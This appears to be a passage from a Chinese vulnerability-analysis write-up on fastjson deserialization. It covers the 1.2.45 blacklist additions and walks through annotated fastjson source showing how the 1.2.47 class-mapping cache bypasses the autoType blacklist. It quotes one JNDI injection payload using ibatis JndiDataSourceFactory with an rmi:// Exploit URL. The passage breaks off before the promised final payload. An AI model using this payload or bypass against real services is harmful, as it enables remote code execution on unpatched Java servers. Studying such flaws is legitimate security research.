### 1.2.45 黑名单添加
1.2.45添加了黑名单，封堵了一些可以绕过黑名单的payload，比如:
    //需要有第三方组件ibatis-core 3:0
    {"被屏蔽的type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}
黑名单封堵呢，其实是一个动态的过程，会有很多新增的jar包，如果服务端引入了这些额外的jar包，就会引入一条可利用链，，或者jdk又被发掘出了新增的链等等都会导致黑名单可被绕过。当然在1.2.25之后这都是要在显性白名单的情况下，才有的问题。
之后更新的版本比如1.2.46也都在补充黑名单
但是在1.2.47时，一个全新的payload就没有这种限制，通杀。
### 1.2.47 通杀payload！
我们在分析1.2.47时，将从一个挖掘0day的角度去一步步分析，企图复现这个漏洞的挖掘过程，不然正向看，不得劲。payload在最后给出。
我们重新来理一下`com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String,
java.lang.Class,
int)`这个阻挠我们的方法，上面我们提到过白名单开关时我们走的是不一样的路线，还在注释中提到会有一些固定类型的判断，这就是通杀payload的关键。
我们接下来看的是1.2.47版本的包，我们看总结后的代码结构：
    public Class checkAutoType(String typeName, Class expectClass, int features) {
            //1.typeName为null的情况，略
            //2.typeName太长或太短的情况，略
            //3.替换typeName中$为.，略
            //4.使用hash的方式去判断[开头，或L开头;结尾，直接报错
            //这里经过几版的修改，有点不一样了，但是绕不过，也略
            //5.autoTypeSupport为true(白名单关闭)的情况下，返回符合白名单的，报错符合黑名单的
            //(这里可以发现，白名单关闭的配置情况下，必须先过黑名单，但是留下了一线生机)
            if (autoTypeSupport || expectClass != null) {
                long hash = h3;
                for (int i = 3; i = 0) {
                        clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                        if (clazz != null) {
                            return clazz;
                        }
                    }
                    //要求满足黑名单并且从一个Mapping中找不到这个类才会报错，这个Mapping就是我们的关键
                    if (Arrays.binarySearch(denyHashCodes, hash) >= 0 && TypeUtils.getClassFromMapping(typeName) == null) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                }
            }
            //6.从一个Mapping中获取这个类名的类，我们之后看
            if (clazz == null) {
                clazz = TypeUtils.getClassFromMapping(typeName);
            }
            //7.从反序列化器中获取这个类名的类，我们也之后看
            if (clazz == null) {
                clazz = deserializers.findClass(typeName);
            }
            //8.如果在6，7中找到了clazz，这里直接return出去，不继续了
            if (clazz != null) {
                if (expectClass != null
                        && clazz != java.util.HashMap.class
                        && !expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
               //无论是默认白名单开启还是手动白名单关闭的情况，我们都要从这个return clazz中出去
                return clazz;
            }
            // 9. 针对默认白名单开启情况的处理，这里
            if (!autoTypeSupport) {
                long hash = h3;
                for (int i = 3; i = 0) {
                        throw new JSONException("autoType is not support. " + typeName);
                    }
                    //满足白名单可以活，但是白名单默认是空的
                    if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
                        if (clazz == null) {
                            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
                        }
                        //针对expectCLass的特殊处理，没有expectCLass，不管
                        if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                        }
                        return clazz;
                    }
                }
            }
            //通过以上全部检查，就可以从这里读取clazz
            if (clazz == null) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);
            }
            //这里对一些特殊的class进行处理，不重要
           //特性判断等
            return clazz;
        }
仔细分析了一下，可以发现无论是白名单开启与否，我们的恶意类都要想办法必须要从第8步的`return clazz`出去才有机会。
  1. 因为白名单关闭（手动）时，我们如果进入第九步，会百分百跟黑名单正面撞上，必然被杀。我们只能在这之前溜出去，机会就在6，7步中。
  2. 白名单开启时（默认），虽然在第五步时，我们也会跟黑名单撞上，但是却莫名其妙的会有一线生机，只要满足`TypeUtils.getClassFromMapping(typeName) != null`（是!=）反而可以从黑名单中逃开。然后从第八步中return出去。
那往之前看clazz可以从哪里赋值，5、6、7三个地方，但是5是白名单匹配才返回。这不可能。
于是开始关注6，7这两个操作到底是干啥的，（其实根据已知白名单开不开都通杀的特性，肯定是在第6步`TypeUtils.getClassFromMapping`中得到的恶意类，但是这边都瞅瞅，后面也会用到）
  1. TypeUtils.getClassFromMapping(typeName)
  2. deserializers.findClass(typeName)
#### deserializers.findClass(typeName)
先看desesrializers，一个hashmap
    private final IdentityHashMap deserializers         = new IdentityHashMap();
因为我们是从中取值，关注一下它是在哪里赋值的，当前文件搜索`deserializers.put`。
`com.alibaba.fastjson.parser.ParserConfig#initDeserializers`：给出一部分截图
initDeserializers这个函数是在parserConfig类的构造函数中初始化时调用的，存放的是一些认为没有危害的固定常用类。理所当然不会包含我们的利用类。
除此之外还有两个类会影响到desesrializers这个map
    com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class, java.lang.reflect.Type)
        //太过复杂代码省略
在这个类中会往deserializers这个mapping中放入一些特定类：`java.awt.*`、`java.time.*`、`java.util.Optional*`、`java.nio.file.Path`、`Map.Entry.class`、以及在服务器`META-INF/services/`目录下存放的class文件，还有枚举类的一些判断。对于一些数组，集合，map等再调用`putDesserializer`（这也是另一个会影响到desesrializers这个map的类）放入deserializers这个mapping中。
在这个类中对于类名有着严格的要求和限定，不太行。看下一个。
    com.alibaba.fastjson.parser.ParserConfig#putDeserializer
    public void putDeserializer(Type type, ObjectDeserializer deserializer) {
            deserializers.put(type, deserializer);
        }
代码极其简单，但是只在ParserConfig#getDeserializer（就是上面那个类）和`initJavaBeanDeserializers`类中使用过。但是后者是一个初始化函数，我们同样不可控输入值。
那么我们好像发现我们的输入不可以改变deserializers这个mapping的值，从而自然也不能进一步在checkAutoType中被get读取出来，也就绕过不了。
这个 **deserializers在checkAutoType方法中存在的意义** 应该是直接放行一些常用的类，来提升解析速度。
那我们换一条路看看`TypeUtils.getClassFromMapping(typeName)`。
#### TypeUtils.getClassFromMapping(typeName)
先看`getClassFromMapping`：
    //这个map是一个hashmap
    private static ConcurrentMap> mappings = new ConcurrentHashMap>(16, 0.75f, 1);
        ...
        public static Class getClassFromMapping(String className){
            //很简单的一个mapping的get
            return mappings.get(className);
        }
按照套路去寻找影响这个mappings的put方法。搜索`mappings.put`，在下面这两个方法中有找到：
    com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings
    com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)
看`addBaseClassMappings`这个方法，方法内容很长，我们就不细看了，但是它是一个没有传参的方法....这样我们就没有一个可控的参数去控制其中的内容。
    private static void addBaseClassMappings(){
        mappings.put("byte", byte.class);
        mappings.put("short", short.class);
        mappings.put("int", int.class);
        mappings.put("long", long.class);
        //诸如此类的放入一些固定的class至mappings中
        ...
    }
并且还只在两个没毛病的地方调用了这个方法：
前者是一个static静态代码块：
    static{
            addBaseClassMappings();
        }
后者是一个`clearClassMapping`方法：
    public static void clearClassMapping(){
        mappings.clear();
        addBaseClassMappings();
    }
没戏，不可控。
再看另一个有mappings.put的位置`TypeUtils.loadClass`，我们需要详细看看这个方法：
> 其实这个TypeUtils.loadClass，在1.2.25-1.2.41中我们分析过一小段，其实是同一个函数！
    public static Class loadClass(String className, ClassLoader classLoader, boolean cache) {
            //判断className是否为空，是的话直接返回null
            if(className == null || className.length() == 0){
                return null;
            }
            //判断className是否已经存在于mappings中
            Class clazz = mappings.get(className);
            if(clazz != null){
                //是的话，直接返回
                return clazz;
            }
            //判断className是否是[开头，1.2.44中针对限制的东西就是这个
            if(className.charAt(0) == '['){
                Class componentType = loadClass(className.substring(1), classLoader);
                return Array.newInstance(componentType, 0).getClass();
            }
            //判断className是否L开头;结尾，1.2.42，43中针对限制的就是这里，但都是在外面限制的，里面的东西没变
            if(className.startsWith("L") && className.endsWith(";")){
                String newClassName = className.substring(1, className.length() - 1);
                return loadClass(newClassName, classLoader);
            }
            //1. 我们需要关注的mappings在这里有
            try{
                //输入的classLoader不为空时
                if(classLoader != null){
                    //调用加载器去加载我们给的className
                    clazz = classLoader.loadClass(className);
                    //！！如果cache为true！！
                    if (cache) {
                        //往我们关注的mappings中写入这个className
                        mappings.put(className, clazz);
                    }
                    return clazz;//返回加载出来的类
                }
            } catch(Throwable e){
                e.printStackTrace();
                // skip
            }
            //2. 在这里也有，但是好像这里有关线程，比较严格。
            try{
                ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
                if(contextClassLoader != null && contextClassLoader != classLoader){
                    clazz = contextClassLoader.loadClass(className);
                    //同样需要输入的cache为true，才有可能修改
                    if (cache) {
                        mappings.put(className, clazz);
                    }
                    return clazz;
                }
            } catch(Throwable e){
                // skip